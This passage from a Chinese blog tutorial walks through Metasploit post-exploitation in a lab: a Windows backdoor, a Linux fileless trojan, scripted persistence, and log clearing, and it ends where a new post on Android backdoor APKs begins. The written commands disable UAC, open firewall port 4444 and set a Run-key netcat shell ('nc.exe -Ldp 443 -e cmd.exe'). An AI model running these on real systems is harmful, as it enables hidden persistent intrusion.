<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8F%E5%90%8E%E9%97%A8/image-20210819105650319.png" alt="image-20210819105650319"></p>
<p>启动远程桌面</p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8F%E5%90%8E%E9%97%A8/image-20210819105837404.png" alt="image-20210819105837404"></p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8F%E5%90%8E%E9%97%A8/image-20210819105910331.png" alt="image-20210819105910331"></p>
<p>输入密码后，若对方正在登录则会提升如下图。（对方也会有对应的提升，如果对方30s/一段时间没操作就会默认允许）</p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8F%E5%90%8E%E9%97%A8/image-20210819105942245.png" alt="image-20210819105942245"></p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8F%E5%90%8E%E9%97%A8/image-20210819110057886.png" alt="image-20210819110057886"></p>
<p><strong>步骤3：</strong>关闭主机防护策略并开启后门</p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8F%E5%90%8E%E9%97%A8/image-20210819110454539.png" alt="image-20210819110454539"></p>
<p>这利用SAM，红色字段就是用哈斯算法加密的账号密码，前面是账号</p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8F%E5%90%8E%E9%97%A8/image-20210819110728859.png" alt="image-20210819110728859"></p>
<p>补充：kali（linux系统）进入window的shell后会有乱码，可以输入输入 chcp 65001</p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8F%E5%90%8E%E9%97%A8/image-20210819110958691.png" alt="image-20210819110958691"></p>
<p>指令：netsh firewall add portopening TCP 4444 “xuegod” ENABLE ALL</p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8F%E5%90%8E%E9%97%A8/image-20210819111013939.png" alt="image-20210819111013939"></p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8F%E5%90%8E%E9%97%A8/image-20210819111056435.png" alt="image-20210819111056435"></p>
<p>指令：cmd.exe/k %windir%\System32\reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f</p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8F%E5%90%8E%E9%97%A8/image-20210819111130454.png" alt="image-20210819111130454"></p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8F%E5%90%8E%E9%97%A8/image-20210819111235180.png" alt="image-20210819111235180"></p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8F%E5%90%8E%E9%97%A8/image-20210819111252073.png" alt="image-20210819111252073"></p>
<p>退出shell：Ctrl+c</p>
<p>指令：cmd.exe/k %windir%\System32\reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v  LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f</p>
<p><strong>步骤3：</strong>使用密码hash值登录系统</p>
<p>说明：1.红色字段是步骤2用hashdump查看到xuegod的密码哈斯值</p>
<p>2.SMBDomain值来自win7的工作组，如下图</p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8F%E5%90%8E%E9%97%A8/image-20210819111937637.png" alt="image-20210819111937637"></p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8F%E5%90%8E%E9%97%A8/image-20210819111520715.png" alt="image-20210819111520715"></p>
<p>补充：如果失败了，多尝试几次（即使配置都正确，也不会100%成功）</p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8F%E5%90%8E%E9%97%A8/image-20210819112119208.png" alt="image-20210819112119208"></p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8F%E5%90%8E%E9%97%A8/image-20210819112142192.png" alt="image-20210819112142192"></p>
<p>说明：C:\windows\system32只是存放路径，可以放得隐藏些，但要记住（后面还要用）</p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8F%E5%90%8E%E9%97%A8/image-20210819112827492.png" alt="image-20210819112827492"></p>
<p>指令：reg setval -k HKLM\software\microsoft\windows\currentversion\run -v lltest_nc -d ‘C:\windows\nc.exe -Ldp 443 -e cmd.exe’</p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8F%E5%90%8E%E9%97%A8/image-20210819112348784.png" alt="image-20210819112348784"></p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8F%E5%90%8E%E9%97%A8/image-20210819112412948.png" alt="image-20210819112412948"></p>
<p>也可以这样重启</p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8F%E5%90%8E%E9%97%A8/image-20210819113147179.png" alt="image-20210819113147179"></p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8F%E5%90%8E%E9%97%A8/image-20210819113008314.png" alt="image-20210819113008314"></p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8F%E5%90%8E%E9%97%A8/image-20210819113051369.png" alt="image-20210819113051369"> </p>
<p>登录后程序才会运行，防火墙会弹出提示</p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8F%E5%90%8E%E9%97%A8/image-20210819113307966.png" alt="image-20210819113307966"></p>
<p>程序已经在win7后台进行在监听</p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8F%E5%90%8E%E9%97%A8/image-20210819113701382.png" alt="image-20210819113701382"></p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8F%E5%90%8E%E9%97%A8/image-20210819113549553.png" alt="image-20210819113549553"></p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8F%E5%90%8E%E9%97%A8/image-20210819113756461.png" alt="image-20210819113756461"></p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8F%E5%90%8E%E9%97%A8/image-20210819113805371.png" alt="image-20210819113805371"></p>
<h2 id="三、Linux无文件木马程序"><a href="#三、Linux无文件木马程序" class="headerlink" title="三、Linux无文件木马程序"></a>三、Linux无文件木马程序</h2><p><strong>环境</strong></p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8F%E5%90%8E%E9%97%A8/image-20210819155530456.png" alt="image-20210819155530456"></p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8F%E5%90%8E%E9%97%A8/image-20210819160114518.png" alt="image-20210819160114518"></p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8F%E5%90%8E%E9%97%A8/image-20210819160212702.png" alt="image-20210819160212702"></p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8F%E5%90%8E%E9%97%A8/image-20210819160235373.png" alt="image-20210819160235373"></p>
<p><strong>步骤1</strong>：监听</p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8F%E5%90%8E%E9%97%A8/image-20210819160459633.png" alt="image-20210819160459633"></p>
<p>渗透</p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8F%E5%90%8E%E9%97%A8/image-20210819160606476.png" alt="image-20210819160606476"></p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8F%E5%90%8E%E9%97%A8/image-20210819160633596.png" alt="image-20210819160633596"></p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8F%E5%90%8E%E9%97%A8/image-20210819160805424.png" alt="image-20210819160805424"></p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8F%E5%90%8E%E9%97%A8/image-20210819160847284.png" alt="image-20210819160847284"></p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8F%E5%90%8E%E9%97%A8/image-20210819160858685.png" alt="image-20210819160858685"></p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8F%E5%90%8E%E9%97%A8/image-20210819160951858.png" alt="image-20210819160951858"></p>
<p>渗透成功</p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8F%E5%90%8E%E9%97%A8/image-20210819161050688.png" alt="image-20210819161050688"></p>
<p><strong>步骤2：</strong>到centos操作系统下载执行文件来建立session</p>
<p>（为了模拟实战隐藏行为效果，通过session进行操作）</p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8F%E5%90%8E%E9%97%A8/image-20210819161335768.png" alt="image-20210819161335768"></p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8F%E5%90%8E%E9%97%A8/image-20210819161825848.png" alt="image-20210819161825848"></p>
<p>补充：</p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8F%E5%90%8E%E9%97%A8/image-20210819161537170.png" alt="image-20210819161537170"></p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8F%E5%90%8E%E9%97%A8/image-20210819161548062.png" alt="image-20210819161548062"></p>
<p>直接输入程序地址来执行</p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8F%E5%90%8E%E9%97%A8/image-20210819161706964.png" alt="image-20210819161706964"></p>
<p>查看程序地址</p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8F%E5%90%8E%E9%97%A8/image-20210819161734385.png" alt="image-20210819161734385"></p>
<p><strong>步骤3</strong>：创建无文件后门程序</p>
<p>配置监听4444端口（要新开个终端窗口）</p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8F%E5%90%8E%E9%97%A8/image-20210819162015597.png" alt="image-20210819162015597"></p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8F%E5%90%8E%E9%97%A8/image-20210819162602534.png" alt="image-20210819162602534"></p>
<p>（靶机终端效果展示）</p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8F%E5%90%8E%E9%97%A8/image-20210819162708421.png" alt="image-20210819162708421"></p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8F%E5%90%8E%E9%97%A8/image-20210819162825798.png" alt="image-20210819162825798"></p>
<p>说明：我们的木马文件必须放在vegile文件下</p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8F%E5%90%8E%E9%97%A8/image-20210819163137866.png" alt="image-20210819163137866"></p>
<p>（靶机终端效果展示）</p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8F%E5%90%8E%E9%97%A8/image-20210819163209475.png" alt="image-20210819163209475"></p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8F%E5%90%8E%E9%97%A8/image-20210819163318186.png" alt="image-20210819163318186"></p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8F%E5%90%8E%E9%97%A8/image-20210819163454991.png" alt="image-20210819163454991"></p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8F%E5%90%8E%E9%97%A8/image-20210819163629607.png" alt="image-20210819163629607"></p>
<p>效果</p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8F%E5%90%8E%E9%97%A8/image-20210819163806587.png" alt="image-20210819163806587"></p>
<p>补充：由于我们远程控制靶机下载了2个恶意文件，很容易暴露</p>
<p>我们可以删除2个文件，其还可以监听到</p>
<p>靶机端删除</p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8F%E5%90%8E%E9%97%A8/image-20210819164122924.png" alt="image-20210819164122924"></p>
<p>攻击者端</p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8F%E5%90%8E%E9%97%A8/image-20210819164347771.png" alt="image-20210819164347771"></p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8F%E5%90%8E%E9%97%A8/image-20210819164453141.png" alt="image-20210819164453141"></p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8F%E5%90%8E%E9%97%A8/image-20210819164501638.png" alt="image-20210819164501638"></p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8F%E5%90%8E%E9%97%A8/image-20210819164529645.png" alt="image-20210819164529645"></p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8F%E5%90%8E%E9%97%A8/image-20210819201847720.png" alt="image-20210819201847720"></p>
<h2 id="四、使用脚本进行自动创建后门"><a href="#四、使用脚本进行自动创建后门" class="headerlink" title="四、使用脚本进行自动创建后门"></a>四、使用脚本进行自动创建后门</h2><p><strong>步骤1：</strong>配置脚本程序：</p>
<p>​    注意要如图所视目录操作；因为后面的下载路径是根据这里来的。（当然也可以该，要是要注意下载路径）</p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8F%E5%90%8E%E9%97%A8/image-20210819202050680.png" alt="image-20210819202050680"></p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8F%E5%90%8E%E9%97%A8/image-20210819202616448.png" alt="image-20210819202616448"></p>
<p>步骤2：渗透</p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8F%E5%90%8E%E9%97%A8/image-20210819202658813.png" alt="image-20210819202658813"></p>
<p>（监听与上面实战例子的渗透模块一样，所以这里就不写操作了）</p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8F%E5%90%8E%E9%97%A8/image-20210819202433617.png" alt="image-20210819202433617"></p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8F%E5%90%8E%E9%97%A8/image-20210819202832845.png" alt="image-20210819202832845"></p>
<p>靶机执行脚本（这里只是为了展示，应该是有kali里执行比较好）</p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8F%E5%90%8E%E9%97%A8/image-20210819203051765.png" alt="image-20210819203051765"></p>
<p>kali查看监听结果</p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8F%E5%90%8E%E9%97%A8/image-20210819203151702.png" alt="image-20210819203151702"></p>
<p>进入会话后</p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8F%E5%90%8E%E9%97%A8/image-20210819203304121.png" alt="image-20210819203304121"></p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8F%E5%90%8E%E9%97%A8/image-20210819203339202.png" alt="image-20210819203339202"></p>
<p><strong>步骤3：</strong>让脚本自动运行</p>
<p>方法1：配置开机自启动</p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8F%E5%90%8E%E9%97%A8/image-20210819203504865.png" alt="image-20210819203504865"></p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8F%E5%90%8E%E9%97%A8/image-20210819203920988.png" alt="image-20210819203920988"></p>
<p>方法2：配置系统级别的计划任务</p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8F%E5%90%8E%E9%97%A8/image-20210819204117351.png" alt="image-20210819204117351"></p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8F%E5%90%8E%E9%97%A8/image-20210819204145273.png" alt="image-20210819204145273"></p>
<p>效果说明：靶机系统让脚本每小时启动一次</p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8F%E5%90%8E%E9%97%A8/image-20210819204258879.png" alt="image-20210819204258879"></p>
<h2 id="五、清理系统日志"><a href="#五、清理系统日志" class="headerlink" title="五、清理系统日志"></a>五、清理系统日志</h2><p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8F%E5%90%8E%E9%97%A8/image-20210819204504875.png" alt="image-20210819204504875"></p>
<h4 id="5-1-window日志清理"><a href="#5-1-window日志清理" class="headerlink" title="5.1 window日志清理"></a><strong>5.1 window日志清理</strong></h4><p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8F%E5%90%8E%E9%97%A8/image-20210819204549925.png" alt="image-20210819204549925"></p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8F%E5%90%8E%E9%97%A8/image-20210819204652982.png" alt="image-20210819204652982"></p>
<p>​        也可以</p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8F%E5%90%8E%E9%97%A8/image-20210819204737145.png" alt="image-20210819204737145"></p>
<h4 id="5-2-Linux日志清理"><a href="#5-2-Linux日志清理" class="headerlink" title="5.2 Linux日志清理"></a><strong>5.2 Linux日志清理</strong></h4><p>kali进入其shell里操作</p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8F%E5%90%8E%E9%97%A8/image-20210819204946095.png" alt="image-20210819204946095"></p>
<p>  也可以</p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8F%E5%90%8E%E9%97%A8/image-20210819205049062.png" alt="image-20210819205049062"></p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8F%E5%90%8E%E9%97%A8/image-20210819205105885.png" alt="image-20210819205105885"></p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8F%E5%90%8E%E9%97%A8/image-20210819205150600.png" alt="image-20210819205150600"></p>
<p>还可以</p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8F%E5%90%8E%E9%97%A8/image-20210819205205428.png" alt="image-20210819205205428"></p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8F%E5%90%8E%E9%97%A8/image-20210819205220293.png" alt="image-20210819205220293"></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://wgc5.gitee.io/2021/08/18/%E5%AE%89%E5%8D%93%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="北极星上的稻草人">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="北极星上的稻草人">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/08/18/%E5%AE%89%E5%8D%93%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/" class="post-title-link" itemprop="url">安卓客户端渗透</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2021-08-18 18:29:35 / 修改时间：18:32:40" itemprop="dateCreated datePublished" datetime="2021-08-18T18:29:35+08:00">2021-08-18</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">信息安全</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="安卓客户端渗透"><a href="#安卓客户端渗透" class="headerlink" title="安卓客户端渗透"></a>安卓客户端渗透</h1><h2 id="一、后门程序渗透安卓"><a href="#一、后门程序渗透安卓" class="headerlink" title="一、后门程序渗透安卓"></a>一、后门程序渗透安卓</h2><p>步骤1：使用MSF生成一个apk的后门应用程序</p>
